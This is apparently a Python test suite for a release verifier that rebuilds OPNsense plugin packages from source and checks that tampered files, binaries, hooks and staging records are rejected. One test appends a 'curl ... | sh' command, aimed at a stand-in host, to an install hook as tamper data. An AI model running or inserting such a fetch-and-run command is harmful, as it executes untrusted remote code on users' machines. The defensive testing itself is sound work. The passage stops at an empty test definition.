"""Rebuild every publishable plugin from its committed source and break it on purpose.

The fixtures here stage each plugin the way its build.sh does -- a transcription of
the shell, kept deliberately separate from packaging/plugins.json -- so a package
only verifies when the committed staging record and the committed build agree.
"""
import hashlib
import importlib.util
import io
import json
import os
from pathlib import Path
import re
import shutil
import subprocess
import sys
import tarfile
import tempfile
from types import SimpleNamespace
import unittest
from unittest.mock import patch


REPO = Path(__file__).resolve().parents[1]
SPEC = importlib.util.spec_from_file_location('release_verifier', REPO / 'verify-repo.py')
verify = importlib.util.module_from_spec(SPEC)
SPEC.loader.exec_module(verify)
SITE = REPO / '.site'
PHASES = [('pre-install', '+PRE_INSTALL'), ('post-install', '+POST_INSTALL'),
          ('pre-deinstall', '+PRE_DEINSTALL'), ('post-deinstall', '+POST_DEINSTALL')]
NATIVE = 'FreeBSD:15:amd64'
WILDCARD = 'FreeBSD:*:amd64'

DDCLIENT_VERSION = ('{"product_abi":"26.7","product_arch":"amd64","product_email":"https://github.com/Opnwall/",'
                    '"product_id":"os-ddclient-opnwall","product_name":"ddclient-opnwall","product_tier":"4",'
                    '"product_version":"@VERSION@","product_website":"https://github.com/Opnwall/OPNsense-dyndns"}\n')
UNBOUND_VERSION = ('{\n    "product_abi": "26.7",\n    "product_arch": "amd64",\n'
                   '    "product_email": "https://github.com/Opnwall/",\n'
                   '    "product_id": "os-unboundcustom",\n    "product_name": "unboundcustom",\n'
                   '    "product_tier": "4",\n    "product_version": "@VERSION@",\n'
                   '    "product_website": "https://pfchina.org/"\n}\n')

# What each build.sh actually stages, read off the shell and written out again here.
BUILDS = {
    'os-staticarp': {'deps': {'python313': {'origin': 'lang/python313', 'version': '>=0'}}, 'abi': NATIVE, 'copy': [('src', '/')],
                    'shared_copy': [('src/common/config_backup.py', '/usr/local/opnsense/scripts/staticarp/config_backup.py'),
                                    ('src/common/config_backup.php', '/usr/local/opnsense/scripts/staticarp/config_backup.php')]},
    'os-pftop': {'abi': WILDCARD, 'copy': [('src/usr', '/usr')]},
    'os-lang': {'abi': WILDCARD, 'copy': [('src', '/')]},
    'os-easytier': {'deps': {'python313': {'origin': 'lang/python313', 'version': '>=0'}}, 'abi': NATIVE, 'copy': [('src', '/')],
                   'shared_copy': [('src/common/config_backup.py', '/usr/local/opnsense/scripts/easytier/config_backup.py'),
                                   ('src/common/config_backup.php', '/usr/local/opnsense/scripts/easytier/config_backup.php'),
                                   ('src/common/process_identity.py', '/usr/local/opnsense/scripts/easytier/process_identity.py'),
                                   ('src/common/route_control.py', '/usr/local/opnsense/scripts/easytier/route_control.py')]},
    'os-ddns-go': {'deps': {'python313': {'origin': 'lang/python313', 'version': '>=0'}}, 'abi': NATIVE, 'copy': [('src', '/')],
                  'shared_copy': [('src/common/config_backup.py', '/usr/local/opnsense/scripts/ddnsgo/config_backup.py'),
                                  ('src/common/process_control.py', '/usr/local/opnsense/scripts/ddnsgo/process_control.py'),
                                  ('src/common/process_identity.py', '/usr/local/opnsense/scripts/ddnsgo/process_identity.py'),
                                  ('src/common/config_backup.php', '/usr/local/opnsense/scripts/ddnsgo/config_backup.php')]},
    'os-lucky': {'deps': {'python313': {'origin': 'lang/python313', 'version': '>=0'}}, 'abi': NATIVE, 'copy': [('src', '/')],
                 'shared_copy': [('src/common/config_backup.py', '/usr/local/opnsense/scripts/lucky/config_backup.py'),
                                  ('src/common/process_control.py', '/usr/local/opnsense/scripts/lucky/process_control.py'),
                                  ('src/common/process_identity.py', '/usr/local/opnsense/scripts/lucky/process_identity.py'),
                                 ('src/common/config_backup.php', '/usr/local/opnsense/scripts/lucky/config_backup.php')],
                 'unpack': [('src/usr/local/bin/lucky_2.27.2_freebsd_x86_64.tar.gz', 'tar.gz',
                             {'lucky': '/usr/local/bin/lucky'})]},
    'os-speedtest': {'abi': NATIVE, 'copy': [('src', '/')],
                     'unpack': [('src/usr/local/bin/speedtest-go_1.7.10_Freebsd_x86_64.tar.gz', 'tar.gz',
                                 {'speedtest-go': '/usr/local/bin/opnsense-speedtest'})]},
    'os-sing-box': {'abi': NATIVE, 'copy': [('src', '/')],
                    'shared_copy': [('src/common/config_backup.py', '/usr/local/opnsense/scripts/singbox/config_backup.py'),
                                    ('src/common/config_backup.php', '/usr/local/opnsense/scripts/singbox/config_backup.php'),
                                    ('src/common/process_identity.py', '/usr/local/opnsense/scripts/singbox/process_identity.py'),
                                    ('src/common/route_control.py', '/usr/local/opnsense/scripts/singbox/route_control.py'),
                                    ('src/common/tun_policy_routing.py', '/usr/local/opnsense/scripts/singbox/tun_policy_routing.py')],
                    'deps': {'python313': {'origin': 'lang/python313', 'version': '>=0'},
                             'jq': {'origin': 'textproc/jq', 'version': '>=0'},
                             'curl': {'origin': 'ftp/curl', 'version': '>=0'}},
                    'unpack': [('src/usr/local/bin/bsd-box-reF1nd-freebsd-amd64.xz', 'xz',
                                {None: '/usr/local/bin/sing-box'})]},
    'os-frp': {'abi': NATIVE, 'copy': [('src', '/')],
               'unpack': [('vendor/frp_0.71.0_freebsd_amd64.tar.gz', 'tar.gz',
                           {'frp_0.71.0_freebsd_amd64/frps': '/usr/local/sbin/frps',
                            'frp_0.71.0_freebsd_amd64/frpc': '/usr/local/sbin/frpc'})]},
    'os-unboundcustom': {'abi': WILDCARD, 'copy': [('src/opnsense', '/usr/local/opnsense')],
                         'shared_copy': [('src/common/process_identity.py', '/usr/local/opnsense/scripts/OPNsense/Unboundcustom/process_identity.py')],
                         'deps': {'python313': {'origin': 'lang/python313', 'version': '>=3.13'}},
                         'generate': {'/usr/local/opnsense/version/unboundcustom': UNBOUND_VERSION},
                         'annotations': 'version-file'},
    'os-ddclient-opnwall': {'abi': WILDCARD, 'copy': [('src/etc', '/usr/local/etc'), ('src/usr', '/usr')],
                            'deps': {'ddclient': {'origin': 'dns/ddclient', 'version': '0'},
                                     'py313-boto3': {'origin': 'devel/py-boto3@py313', 'version': '0'}},
                            'generate': {'/usr/local/opnsense/version/ddclient-opnwall': DDCLIENT_VERSION}},
    'os-kazuha-repo': {'abi': WILDCARD, 'copy': [('src', '/')], 'version_rewrite': True,
                       'annotations': 'version-file'},
    'os-ttyd': {'abi': NATIVE, 'copy': [('src', '/')],
                'shared_copy': [('src/common/config_backup.py', '/usr/local/opnsense/scripts/ttyd/config_backup.py'),
                                ('src/common/config_backup.php', '/usr/local/opnsense/scripts/ttyd/config_backup.php')],
                'unpack': [
                    ('vendor/freebsd15-amd64/libuv.pkg', 'pkg', {
                        '/usr/local/lib/libuv.so.1.0.0': '/usr/local/os-ttyd/lib/libuv.so.1.0.0',
                        '/usr/local/share/licenses/libuv-1.52.1/LICENSE': '/usr/local/os-ttyd/share/licenses/libuv-1.52.1/LICENSE',
                        '/usr/local/share/licenses/libuv-1.52.1/MIT': '/usr/local/os-ttyd/share/licenses/libuv-1.52.1/MIT',
                        '/usr/local/share/licenses/libuv-1.52.1/catalog.mk': '/usr/local/os-ttyd/share/licenses/libuv-1.52.1/catalog.mk'}),
                    ('vendor/freebsd15-amd64/libuv.pkg', 'pkg', {
                        '/usr/local/lib/libuv.so.1.0.0': '/usr/local/os-ttyd/lib/libuv.so.1'}),
                    ('vendor/freebsd15-amd64/libuv.pkg', 'pkg', {
                        '/usr/local/lib/libuv.so.1.0.0': '/usr/local/os-ttyd/lib/libuv.so'}),
                    ('vendor/freebsd15-amd64/libwebsockets.pkg', 'pkg', {
                        '/usr/local/lib/libwebsockets.so.21': '/usr/local/os-ttyd/lib/libwebsockets.so.21',
                        '/usr/local/lib/libwebsockets-evlib_uv.so': '/usr/local/os-ttyd/lib/libwebsockets-evlib_uv.so',
                        '/usr/local/share/licenses/libwebsockets-4.5.8/LICENSE': '/usr/local/os-ttyd/share/licenses/libwebsockets-4.5.8/LICENSE',
                        '/usr/local/share/licenses/libwebsockets-4.5.8/MIT': '/usr/local/os-ttyd/share/licenses/libwebsockets-4.5.8/MIT',
                        '/usr/local/share/licenses/libwebsockets-4.5.8/catalog.mk': '/usr/local/os-ttyd/share/licenses/libwebsockets-4.5.8/catalog.mk'}),
                    ('vendor/freebsd15-amd64/libwebsockets.pkg', 'pkg', {
                        '/usr/local/lib/libwebsockets.so.21': '/usr/local/os-ttyd/lib/libwebsockets.so'}),
                    ('vendor/freebsd15-amd64/ttyd.pkg', 'pkg', {
                        '/usr/local/bin/ttyd': '/usr/local/os-ttyd/bin/ttyd',
                        '/usr/local/share/licenses/ttyd-1.7.7_2/LICENSE': '/usr/local/os-ttyd/share/licenses/ttyd-1.7.7_2/LICENSE',
                        '/usr/local/share/licenses/ttyd-1.7.7_2/MIT': '/usr/local/os-ttyd/share/licenses/ttyd-1.7.7_2/MIT',
                        '/usr/local/share/licenses/ttyd-1.7.7_2/catalog.mk': '/usr/local/os-ttyd/share/licenses/ttyd-1.7.7_2/catalog.mk'})]},
}


def build_version(plugin):
    """The build script owns the version; the staging record has to agree with it."""
    text = (REPO / 'src' / plugin / 'build.sh').read_text()
    return re.search(r'^VERSION="\$\{VERSION:-([^}"]+)\}"', text, re.MULTILINE).group(1)


def encoded(text):
    """How libpkg writes a hook into a JSON manifest: '%' and non-ASCII percent-encoded."""
    return ''.join('%25' if byte == 0x25 else chr(byte) if byte < 0x80 else '%%%02x' % byte
                   for byte in text.encode())


def staged_files(root, plugin, version):
    """Run the transcribed build steps over a plugin source tree."""
    recipe = BUILDS[plugin]
    project = root / 'src' / plugin
    skipped = {project / item[0] for item in recipe.get('unpack', [])}
    staged = {}
    for prefix, destination in recipe['copy']:
        base = project / prefix
        for path in sorted(base.rglob('*')):
            parts = path.relative_to(base).parts
            if not path.is_file() or path in skipped or '__pycache__' in parts:
                continue
            if path.suffix in {'.pyc', '.pyo'} or any(p == '.DS_Store' or p.startswith('._') for p in parts):
                continue
            staged[destination.rstrip('/') + '/' + path.relative_to(base).as_posix()] = path.read_bytes()
    for relative, destination in recipe.get('shared_copy', []):
        staged[destination] = (root / relative).read_bytes()
    for name, kind, members in recipe.get('unpack', []):
        data = (project / name).read_bytes()
        if kind == 'xz':
            import lzma
            staged[next(iter(members.values()))] = lzma.decompress(data)
            continue
        if kind == 'pkg':
            for member, install in members.items():
                staged[install] = subprocess.check_output(['tar', '-xOf', str(project / name), '-P', '--', member])
            continue
        with tarfile.open(fileobj=io.BytesIO(data), mode='r:gz') as archive:
            for member, install in members.items():
                staged[install] = archive.extractfile(archive.getmember(member)).read()
    for install, template in recipe.get('generate', {}).items():
        staged[install] = template.replace('@VERSION@', version).encode()
    if recipe.get('version_rewrite'):
        install = '/usr/local/opnsense/version/kazuha-repo'
        metadata = json.loads(staged[install])
        metadata.update(product_abi='26.7', product_version=version)
        staged[install] = (json.dumps(metadata, separators=(',', ':')) + '\n').encode()
    return staged


def build_package(directory, root, plugin, version=None, files=None, hooks=None, encode=True, abi=None):
    """Assemble the archive and manifest the way pkg create does."""
    recipe = BUILDS[plugin]
    version = version or build_version(plugin)
    staged = staged_files(root, plugin, version) if files is None else files
    scripts = {}
    for phase, filename in PHASES:
        hook = root / 'src' / plugin / 'packaging/freebsd' / filename
        if hook.is_file():
            body = (hooks or {}).get(phase, hook.read_text())
            scripts[phase] = encoded(body) if encode else body
    manifest = {'name': plugin, 'version': version, 'abi': abi or recipe['abi'],
                'origin': 'opnsense/' + plugin, 'prefix': '/usr/local',
                'deps': recipe.get('deps', {}), 'scripts': scripts,
                'files': {path: '1$' + hashlib.sha256(data).hexdigest() for path, data in staged.items()}}
    if recipe.get('annotations') == 'version-file':
        name = 'kazuha-repo' if plugin == 'os-kazuha-repo' else 'unboundcustom'
        manifest['annotations'] = json.loads(staged['/usr/local/opnsense/version/' + name])
    package = directory / (plugin + '-' + version + '.pkg')
    payload = json.dumps(manifest).encode()
    with tarfile.open(package, 'w') as archive:
        for name, data in [('+MANIFEST', payload), ('+COMPACT_MANIFEST', payload)]:
            add_member(archive, name, data)
        for path, data in staged.items():
            add_member(archive, path.lstrip('/'), data)
    return package


def add_member(archive, name, data):
    item = tarfile.TarInfo(name)
    item.size = len(data)
    archive.addfile(item, io.BytesIO(data))


class SourceTree(unittest.TestCase):
    """A source root whose src/ is the repository's own, with a record we can edit."""

    def setUp(self):
        self.temp = tempfile.TemporaryDirectory()
        self.addCleanup(self.temp.cleanup)
        self.root = Path(self.temp.name)
        self.dist = self.root / 'dist'
        self.dist.mkdir()

    def source(self, records=None):
        root = Path(tempfile.mkdtemp(dir=self.temp.name))
        (root / 'src').mkdir()
        for entry in (REPO / 'src').iterdir():
            if entry.name == 'common':
                shutil.copytree(entry, root / 'src/common', symlinks=True)
            else:
                (root / 'src' / entry.name).symlink_to(entry, target_is_directory=entry.is_dir())
        (root / 'packaging').mkdir()
        registry = json.loads((REPO / 'packaging/plugins.json').read_text())
        if records:
            registry['plugins'].update(records)
        (root / 'packaging/plugins.json').write_text(json.dumps(registry))
        return root

    def record(self, plugin):
        return json.loads((REPO / 'packaging/plugins.json').read_text())['plugins'][plugin]


class PluginPackageTests(SourceTree):
    def test_every_recorded_plugin_verifies_against_its_own_source(self):
        for plugin in sorted(BUILDS):
            with self.subTest(plugin=plugin):
                package = build_package(self.dist, REPO, plugin)
                verify.verify_source_package(package, REPO, plugin=plugin)

    def test_a_zstd_compressed_package_is_read_the_same_way(self):
        # tzst is what pkg create writes unless a build asks for tgz, and the
        # signing host's Python cannot open one: os-mihomo, os-sing-box and
        # os-kazuha-repo all arrive in that format.
        if not shutil.which('zstd'):
            self.skipTest('zstd is not installed')
        package = build_package(self.dist, REPO, 'os-staticarp')
        compressed = self.dist / 'staticarp-tzst.pkg'
        compressed.write_bytes(subprocess.run(['zstd', '-cq', '--', str(package)],
                                              check=True, stdout=subprocess.PIPE).stdout)
        self.assertEqual(verify.ZSTD_MAGIC, compressed.read_bytes()[:4])
        verify.verify_source_package(compressed, REPO, plugin='os-staticarp')
        # And the fallback stays a decompressor, not a way to wave a broken
        # archive through: anything that is neither tar nor zstd still fails.
        broken = self.dist / 'staticarp-broken.pkg'
        broken.write_bytes(b'not an archive at all')
        with self.assertRaises(tarfile.ReadError):
            verify.python_members(broken)

    def test_one_changed_byte_in_any_file_is_rejected(self):
        for plugin in ('os-staticarp', 'os-lang', 'os-frp'):
            version = build_version(plugin)
            staged = staged_files(REPO, plugin, version)
            for path in sorted(staged)[:4]:
                changed = dict(staged)
                changed[path] = changed[path] + b'\n'
                package = build_package(self.dist, REPO, plugin, files=changed)
                with self.subTest(plugin=plugin, path=path), \
                        self.assertRaisesRegex(ValueError, 'Package content differs from source'):
                    verify.verify_source_package(package, REPO, plugin=plugin)

    def test_a_file_the_source_does_not_account_for_is_rejected(self):
        staged = staged_files(REPO, 'os-staticarp', build_version('os-staticarp'))
        staged['/usr/local/bin/extra-tool'] = b'#!/bin/sh\nexit 0\n'
        package = build_package(self.dist, REPO, 'os-staticarp', files=staged)
        with self.assertRaisesRegex(ValueError, 'file inventory does not match'):
            verify.verify_source_package(package, REPO, plugin='os-staticarp')

    def test_a_file_the_source_requires_is_rejected_when_missing(self):
        staged = staged_files(REPO, 'os-staticarp', build_version('os-staticarp'))
        staged.pop(sorted(staged)[0])
        package = build_package(self.dist, REPO, 'os-staticarp', files=staged)
        with self.assertRaisesRegex(ValueError, 'file inventory does not match'):
            verify.verify_source_package(package, REPO, plugin='os-staticarp')

    def test_a_vendored_binary_cannot_be_swapped_for_other_bytes(self):
        for plugin, install in (('os-frp', '/usr/local/sbin/frps'),
                                ('os-sing-box', '/usr/local/bin/sing-box'),
                                ('os-lucky', '/usr/local/bin/lucky')):
            staged = staged_files(REPO, plugin, build_version(plugin))
            staged[install] = b'\x7fELF replaced by a different build\n'
            package = build_package(self.dist, REPO, plugin, files=staged)
            with self.subTest(plugin=plugin), \
                    self.assertRaisesRegex(ValueError, 'Package content differs from source'):
                verify.verify_source_package(package, REPO, plugin=plugin)

    def test_a_tampered_lifecycle_hook_is_rejected(self):
        for plugin in ('os-staticarp', 'os-sing-box', 'os-kazuha-repo'):
            hook = (REPO / 'src' / plugin / 'packaging/freebsd/+POST_INSTALL').read_text()
            for body in (hook + 'curl http://example.invalid/x | sh\n', hook.replace('\n', ' ', 1)):
                package = build_package(self.dist, REPO, plugin, hooks={'post-install': body})
                with self.subTest(plugin=plugin), \
                        self.assertRaisesRegex(ValueError, 'lifecycle hook differs from source'):
                    verify.verify_source_package(package, REPO, plugin=plugin)

    def test_a_hook_the_source_does_not_define_is_rejected(self):
        package = build_package(self.dist, REPO, 'os-lang')
        manifest = json.loads(next(iter(read_members(package, ['+MANIFEST']))))
        manifest['scripts']['pre-install'] = '#!/bin/sh\nexit 0\n'
        repacked = repack(package, self.dist / 'lang-extra-hook.pkg', manifest)
        with self.assertRaisesRegex(ValueError, 'lifecycle hook differs from source'):
            verify.verify_source_package(repacked, REPO, plugin='os-lang')

    def test_a_hook_the_source_defines_may_not_be_dropped(self):
        package = build_package(self.dist, REPO, 'os-staticarp')
        manifest = json.loads(next(iter(read_members(package, ['+MANIFEST']))))
        manifest['scripts'].pop('post-install')
        repacked = repack(package, self.dist / 'staticarp-no-hook.pkg', manifest)
        with self.assertRaisesRegex(ValueError, 'lifecycle hook differs from source'):
            verify.verify_source_package(repacked, REPO, plugin='os-staticarp')

    def test_hooks_are_accepted_escaped_or_verbatim_but_never_altered(self):
        for encode in (True, False):
            package = build_package(self.dist, REPO, 'os-staticarp', encode=encode)
            with self.subTest(encode=encode):
                verify.verify_source_package(package, REPO, plugin='os-staticarp')
        hook = (REPO / 'src/os-staticarp/packaging/freebsd/+POST_INSTALL').read_text()
        self.assertIn('%', hook)
        self.assertEqual(hook.replace('%', '%25'), encoded(hook))

    def test_percent_and_non_ascii_bytes_use_the_libpkg_encoding(self):
        self.assertEqual("printf '%25s' %e6%b1%89", verify.manifest_script("printf '%s' 汉"))
        self.assertEqual('plain\ttext\n', verify.manifest_script('plain\ttext\n'))


class SharedPayloadTests(SourceTree):
    def test_a_shared_payload_is_required_and_its_exact_bytes_are_checked(self):
        original = staged_files(REPO, 'os-staticarp', build_version('os-staticarp'))
        for relative, destination in BUILDS['os-staticarp']['shared_copy']:
            self.assertEqual(original[destination], (REPO / relative).read_bytes())
            missing = dict(original)
            missing.pop(destination)
            package = build_package(self.dist, REPO, 'os-staticarp', files=missing)
            with self.subTest(destination=destination, failure='missing'), \
                    self.assertRaisesRegex(ValueError, 'file inventory does not match'):
                verify.verify_source_package(package, REPO, plugin='os-staticarp')
            modified = dict(original)
            modified[destination] += b'\n'
            package = build_package(self.dist, REPO, 'os-staticarp', files=modified)
            with self.subTest(destination=destination, failure='modified'), \
                    self.assertRaisesRegex(ValueError, 'Package content differs from source'):
                verify.verify_source_package(package, REPO, plugin='os-staticarp')

    def test_an_unregistered_shared_copy_is_not_accepted_from_the_build(self):
        record = self.record('os-staticarp')
        record['shared'].pop('src/common/config_backup.py')
        source = self.source({'os-staticarp': record})
        package = build_package(self.dist, REPO, 'os-staticarp')
        with self.assertRaisesRegex(ValueError, 'file inventory does not match'):
            verify.verify_source_package(package, source, plugin='os-staticarp')

    def test_missing_or_changed_shared_source_cannot_verify_an_earlier_package(self):
        for failure in ['missing', 'changed']:
            source = self.source()
            package = build_package(self.dist, source, 'os-staticarp')
            shared = source / 'src/common/config_backup.php'
            if failure == 'missing':
                shared.unlink()
                message = 'Committed source file is missing or unsafe'
            else:
                shared.write_bytes(shared.read_bytes() + b'\n')
                message = 'Package content differs from source'
            with self.subTest(failure=failure), self.assertRaisesRegex(ValueError, message):
                verify.verify_source_package(package, source, plugin='os-staticarp')

    def test_shared_source_records_cannot_escape_the_repository(self):
        package = build_package(self.dist, REPO, 'os-staticarp')
        for relative in ['../outside.py', '/tmp/outside.py', 'src/common/../../outside.py',
                         'src/common/config_backup*.py']:
            record = self.record('os-staticarp')
            record['shared'] = {relative: '/usr/local/opnsense/scripts/staticarp/config_backup.py'}
            source = self.source({'os-staticarp': record})
            with self.subTest(relative=relative), self.assertRaisesRegex(ValueError, 'Unsafe committed source path'):
                verify.verify_source_package(package, source, plugin='os-staticarp')

    def test_shared_file_and_parent_symlinks_cannot_supply_external_bytes(self):
        for link_parent in [False, True]:
            source = self.source()
            package = build_package(self.dist, source, 'os-staticarp')
            outside = Path(tempfile.mkdtemp(dir=self.temp.name))
            if link_parent:
                shutil.copytree(source / 'src/common', outside / 'common')
                shutil.rmtree(source / 'src/common')
                (source / 'src/common').symlink_to(outside / 'common', target_is_directory=True)
            else:
                shared = source / 'src/common/config_backup.py'
                (outside / 'config_backup.py').write_bytes(shared.read_bytes())
                shared.unlink()
                shared.symlink_to(outside / 'config_backup.py')
            with self.subTest(link_parent=link_parent), \
                    self.assertRaisesRegex(ValueError, 'Committed source file is missing or unsafe'):
                verify.verify_source_package(package, source, plugin='os-staticarp')

    def test_shared_mapping_and_install_paths_are_validated(self):
        package = build_package(self.dist, REPO, 'os-staticarp')
        for invalid in [None, [], 'src/common/config_backup.py']:
            record = self.record('os-staticarp')
            record['shared'] = invalid
            source = self.source({'os-staticarp': record})
            with self.subTest(invalid=invalid), self.assertRaisesRegex(ValueError, 'Invalid shared file staging record'):
                verify.verify_source_package(package, source, plugin='os-staticarp')
        for destination in ['relative.py', '/usr/local/../etc/config.py', '//tmp/config.py', '/tmp/config*', '/']:
            record = self.record('os-staticarp')
            record['shared'] = {'src/common/config_backup.py': destination}
            source = self.source({'os-staticarp': record})
            with self.subTest(destination=destination), self.assertRaisesRegex(ValueError, 'Unsafe install path'):
                verify.verify_source_package(package, source, plugin='os-staticarp')

    def test_shared_destinations_cannot_collide_with_each_other_or_staged_files(self):
        package = build_package(self.dist, REPO, 'os-staticarp')
        for destinations, message in [
                (['/tmp/shared.py', '/tmp/shared.py'], 'Shared files claim conflicting install paths'),
                (['/tmp/shared', '/tmp/shared/backup.php'], 'Shared files claim conflicting install paths'),
                (['/usr/local/opnsense/scripts/staticarp/settings.php', '/tmp/backup.php'],
                 'A shared file conflicts with another staged file'),
                (['/usr/local/opnsense/scripts/staticarp', '/tmp/backup.php'],
                 'A shared file conflicts with another staged file')]:
            record = self.record('os-staticarp')
            record['shared'] = dict(zip(['src/common/config_backup.py', 'src/common/config_backup.php'], destinations))
            source = self.source({'os-staticarp': record})
            with self.subTest(destinations=destinations), self.assertRaisesRegex(ValueError, message):
                verify.verify_source_package(package, source, plugin='os-staticarp')

    def test_vendored_and_generated_payloads_cannot_replace_a_shared_file(self):
        record = self.record('os-sing-box')
        record['shared']['src/common/config_backup.py'] = '/usr/local/bin/sing-box'
        source = self.source({'os-sing-box': record})
        package = build_package(self.dist, REPO, 'os-sing-box')
        with self.assertRaisesRegex(ValueError, 'A shared file conflicts with another staged file'):
            verify.verify_source_package(package, source, plugin='os-sing-box')
        record = self.record('os-staticarp')
        destination = record['shared']['src/common/config_backup.py']
        record['generated'] = {destination: {'literal': (REPO / 'src/common/config_backup.py').read_text()}}
        source = self.source({'os-staticarp': record})
        package = build_package(self.dist, REPO, 'os-staticarp')
        with self.assertRaisesRegex(ValueError, 'A generated file conflicts with a shared file'):
            verify.verify_source_package(package, source, plugin='os-staticarp')


class StagingRecordTests(SourceTree):
    def test_a_vendored_artifact_that_misses_its_pin_is_rejected(self):
        record = self.record('os-frp')
        record['vendored'][0]['sha256'] = '0' * 64
        source = self.source({'os-frp': record})
        package = build_package(self.dist, REPO, 'os-frp')
        with self.assertRaisesRegex(ValueError, 'differs from its committed digest'):
            verify.verify_source_package(package, source, plugin='os-frp')

    def test_a_vendored_artifact_without_a_pin_is_rejected(self):
        record = self.record('os-sing-box')
        record['vendored'][0].pop('sha256')
        source = self.source({'os-sing-box': record})
        package = build_package(self.dist, REPO, 'os-sing-box')
        with self.assertRaisesRegex(ValueError, 'only be unpacked with a pinned digest'):
            verify.verify_source_package(package, source, plugin='os-sing-box')

    def test_a_changed_artifact_is_caught_before_it_is_unpacked(self):
        root = Path(tempfile.mkdtemp(dir=self.temp.name))
        plugin = root / 'src/os-vendored'
        (plugin / 'src/usr/local/bin').mkdir(parents=True)
        (plugin / 'packaging/freebsd').mkdir(parents=True)
        (plugin / 'src/usr/local/opnsense/version').mkdir(parents=True)
        (plugin / 'src/usr/local/opnsense/version/vendored').write_text(
            json.dumps({'product_id': 'os-vendored', 'product_version': '1.0.0'}))
        archive = plugin / 'src/usr/local/bin/tool.tar.gz'
        write_archive(archive, {'tool': b'genuine tool\n'})
        digest = hashlib.sha256(archive.read_bytes()).hexdigest()
        registry = {'schema_version': 1, 'plugins': {}}
        registry['plugins']['os-vendored'] = {
            'staging': 'tree', 'abi': 'target', 'version': '1.0.0', 'stage': {'src': '/'}, 'deps': {},
            'vendored': [{'artifact': 'src/usr/local/bin/tool.tar.gz', 'sha256': digest,
                          'archive': 'tar.gz', 'members': {'tool': '/usr/local/bin/tool'}}],
            'version_file': {'path': '/usr/local/opnsense/version/vendored', 'format': 'json'}}
        (root / 'packaging').mkdir(parents=True, exist_ok=True)
        (root / 'packaging/plugins.json').write_text(json.dumps(registry))
        BUILDS['os-vendored'] = {'abi': NATIVE, 'copy': [('src', '/')],
                                 'unpack': [('src/usr/local/bin/tool.tar.gz', 'tar.gz',
                                             {'tool': '/usr/local/bin/tool'})]}
        self.addCleanup(BUILDS.pop, 'os-vendored')
        package = build_package(self.dist, root, 'os-vendored', version='1.0.0')
        verify.verify_source_package(package, root, plugin='os-vendored')
        write_archive(archive, {'tool': b'swapped tool\n'})
        with self.assertRaisesRegex(ValueError, 'differs from its committed digest'):
            verify.verify_source_package(package, root, plugin='os-vendored')

    def test_committed_source_outside_the_staged_directories_is_rejected(self):
        record = self.record('os-staticarp')
        record['stage'] = {'src/usr': '/usr'}
        source = self.source({'os-staticarp': record})
        package = build_package(self.dist, REPO, 'os-staticarp')
        with self.assertRaisesRegex(ValueError, 'outside every staged directory'):
            verify.verify_source_package(package, source, plugin='os-staticarp')

    def test_the_record_version_must_match_the_package_and_the_build(self):
        for plugin in sorted(BUILDS):
            record = self.record(plugin)
            if 'version' in record:
                with self.subTest(plugin=plugin):
                    self.assertEqual(build_version(plugin), record['version'])
        package = build_package(self.dist, REPO, 'os-lang', version='9.9.9')
        with self.assertRaisesRegex(ValueError, 'differs from the committed staging record'):
            verify.verify_source_package(package, REPO, plugin='os-lang')

    def test_makefile_defaults_match_the_package_versions(self):
        for project in sorted((REPO / 'src').glob('os-*')):
            makefile = project / 'Makefile'
            if not makefile.is_file():
                continue
            with self.subTest(plugin=project.name):
                match = re.search(r'^(?:VERSION\?=|PLUGIN_VERSION=)\s*([^\s]+)',
                                  makefile.read_text(), re.MULTILINE)
                self.assertIsNotNone(match)
                self.assertEqual(build_version(project.name), match.group(1))
        for name in ('os-ddns-go', 'os-easytier', 'os-lucky', 'os-sing-box', 'os-staticarp'):
            with self.subTest(plugin=name, override='VERSION'):
                recipe = (REPO / 'src' / name / 'Makefile').read_text()
                self.assertIn('VERSION="$(VERSION)"', recipe)
                self.assertNotRegex(recipe, r'\bVERSION=[0-9]+(?:\.[0-9]+)+\b')
                build = (REPO / 'src' / name / 'build.sh').read_text()
                self.assertIn('PRODUCT_VERSION="$(sed ', build)
                self.assertIn('[ "$PRODUCT_VERSION" = "$VERSION" ] || die', build)

    def test_install_hooks_register_only_their_own_plugin(self):
        for project in sorted((REPO / 'src').glob('os-*')):
            with self.subTest(plugin=project.name):
                body = (project / 'packaging/freebsd/+POST_INSTALL').read_text()
                registered = re.findall(r'register\.php install (os-[A-Za-z0-9-]+)', body)
                self.assertEqual([project.name], registered)
                self.assertNotRegex(body, r'register\.php\s+(?:resync|unregister)\b')
                if project.name != 'os-kazuha-repo':
                    self.assertIn('/usr/local/opnsense/scripts/firmware/repos/kazuha.sh mirror', body)

    def test_declared_dependencies_and_product_metadata_are_enforced(self):
        record = self.record('os-sing-box')
        record['deps'] = {'jq': 'textproc/jq'}
        source = self.source({'os-sing-box': record})
        package = build_package(self.dist, REPO, 'os-sing-box')
        with self.assertRaisesRegex(ValueError, 'dependencies differ'):
            verify.verify_source_package(package, source, plugin='os-sing-box')
        record = self.record('os-lang')
        record['version_file'] = {'path': '/usr/local/opnsense/version/absent', 'format': 'json'}
        source = self.source({'os-lang': record})
        with self.assertRaisesRegex(ValueError, 'installs no product version file'):
            verify.verify_source_package(build_package(self.dist, REPO, 'os-lang'), source, plugin='os-lang')

    def test_product_metadata_must_be_the_json_opnsense_registers(self):
        """Metadata OPNsense skips leaves the plugin out of the plugin list.

        register.php json_decodes every file under /usr/local/opnsense/version and
        ignores one that does not decode or has no product_id. The package still
        installs; it is simply never registered, never reinstalled by a firmware
        sync, and never shown in the web interface. os-speedtest shipped exactly
        that for three releases, so this is pinned rather than assumed.
        """
        for plugin, record in sorted(verify.plugin_records(REPO).items()):
            if record['staging'] == 'unsupported':
                continue
            with self.subTest(plugin=plugin):
                self.assertEqual('json', record['version_file']['format'])
                staged = staged_files(REPO, plugin, build_version(plugin))
                metadata = json.loads(staged[record['version_file']['path']])
                self.assertEqual(plugin, metadata['product_id'])
                self.assertEqual(build_version(plugin), metadata['product_version'])
        # And the format is not a free-text field the next record can widen.
        record = self.record('os-lang')
        record['version_file'] = dict(record['version_file'], format='text')
        source = self.source({'os-lang': record})
        with self.assertRaisesRegex(ValueError, 'Unsupported product version format'):
            verify.verify_source_package(build_package(self.dist, REPO, 'os-lang'), source, plugin='os-lang')

    def test_an_abi_independent_package_may_not_ship_a_native_binary(self):
        record = self.record('os-easytier')
        record['abi'] = 'independent'
        source = self.source({'os-easytier': record})
        package = build_package(self.dist, REPO, 'os-easytier', abi=WILDCARD)
        with self.assertRaisesRegex(ValueError, 'must not contain native executables'):
            verify.verify_source_package(package, source, plugin='os-easytier')

    def test_ttyd_pins_its_runtime_and_materializes_library_aliases(self):
